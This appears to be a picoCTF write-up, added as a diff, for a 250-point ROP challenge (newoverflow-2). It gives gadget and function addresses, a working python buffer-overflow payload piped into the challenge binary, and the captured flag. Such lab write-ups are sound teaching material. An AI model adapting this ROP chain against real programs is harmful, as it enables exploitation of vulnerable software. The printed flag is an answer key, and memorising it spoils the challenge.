@@ -1,0 +1,32 @@
+Points: 250
+Category: Binary Exploitation
+Prompt: Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df on the shell server. Source.
+
+This is a huge ROP challenge, and I thoroughly enjoyed it. After looking
+at the source code, my plan was this:
+    1) Load in 0xdeadbeef as a parameter to win_fn1 using pop rdi gadget
+	a) Then return to win_fn1 to set win1 to true
+    2) Load in the three parameters to win_fn2 using gadget w/ pop rcx ; 
+	pop rsi ; pop rdi
+	a) Then return to win_fn2 to set win2 to true
+    3) Return to win_fn
+I then started collecting the addresses I needed:
+0x400767 -> win_fn1
+0x400781 -> win_fn2
+0x4007be -> win_fn
+0x4090a3 -> pop rdi gadget
+When I tried to get the "pop rcx ; pop rsi ; pop rdi" gadget, I could not
+find it, so for step 2 I just jumped to the address where win2 is set to
+true (0x4007b4). It popped off the rbp, which means after my payload
+returned to where I left off, the rbp was placed after the 0x4007b4
+address. So, I had to overwrite the rbp with junk (8 bytes) so that I
+could finally call win_fn. Here is my final payload:
+
+python -c 'print "a"*72 + "\xa3\x09\x40\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x67\x07\x40\x00\x00\x00\x00\x00\xb4\x07\x40\x00\x00\x00\x00\x00" + "a"*8 + "\xbe\x07\x40\x00\x00\x00\x00\x00"' | ./vuln
+
+Flag: picoCTF{r0p_1t_d0nT_st0p_1t_b1c10cce}
+
+Solved by: Ryan Nguyen
+
+**Sidenote: The creator of the chall left a flag functino already, so
+really you didn't have to ROP. I did it just for the exercise.
